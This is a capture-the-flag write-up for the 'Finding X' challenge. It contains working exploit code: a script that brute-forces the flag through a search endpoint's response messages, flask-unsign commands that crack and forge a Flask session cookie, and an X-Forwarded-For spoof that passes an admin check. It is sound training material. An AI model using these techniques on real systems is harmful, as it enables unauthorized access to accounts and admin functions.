# Finding X - Write-up



## Part 1 
### Vulnerability Analysis
The application contains an API endpoint `/api/search` that processes search queries 
so we just had to bruteforce each letter of the flag to check if the employee existed or not

### Exploitation


The exploit script works by:
1. Testing each possible character in the flag character set
2. Using the application's response to determine if the character is correct
3. Building the flag one character at a time

```python
import requests
import string

url = "https://findingx.ctf.prgy.in/api/search"
flag = ""
characters = string.ascii_letters + string.digits + "{}_"

while True:
    found = False
    for c in characters:
        if c in ["'"]:  
            continue
        attempt = f"{flag}{c}"
        print(f"flag: {flag}, trying: {attempt}")
        burp0_json = {"search": attempt}
        res = requests.post(url, json=burp0_json)
        if "Employee exists." in res.json().get("message", ""):
            flag = attempt
            found = True
            break
    if not found:
        break

print("Final flag:", flag)
```
we get the first part of the flag 
```bash
p_ctf{i_h4t3_br97f0r63_
```


## Part 2 - Authentication Bypass
### Vulnerability Analysis
The second part of the flag is hidden behind an admin panel that requires:
1. A valid admin session
2. A request originating from localhost (127.0.0.1)
from the question it is hinted at XFF 

### Exploitation
The exploit involves three steps:

1. **Flask Session Cookie Cracking**
First, we need to crack the Flask session cookie secret:
```bash
flask-unsign --cookie 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.Z6Wr_w.K5N6C2M4cr53s47SfKlsHzLo_BU' --wordlist rockyou.txt --unsign
```
This reveals the secret key: `ilovecookies`

2. **Forging Admin Cookie**
Using the discovered secret, we can forge an admin session cookie:
```bash
flask-unsign --sign --cookie "{'username': 'admin'}" --secret "ilovecookies"
```

3. **IP Spoofing**
The final step involves bypassing the localhost check by setting the X-Forwarded-For header to 127.0.0.1:

```python
import requests

headers = {
    "X-Forwarded-For": "127.0.0.1",
    "Cookie": "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Z6YhWg.hJamGCuL91iB3p-J83mnq8wtVeU"
}

session = requests.Session()
response = session.get("https://findingx.ctf.prgy.in/admin", headers=headers)
print(response.text)
```

## Complete Flag
Combining both parts of the flag:
`p_ctf{i_h4t3_br97f0r63_b4d_4nd_i_c4n_n0t_l13}`

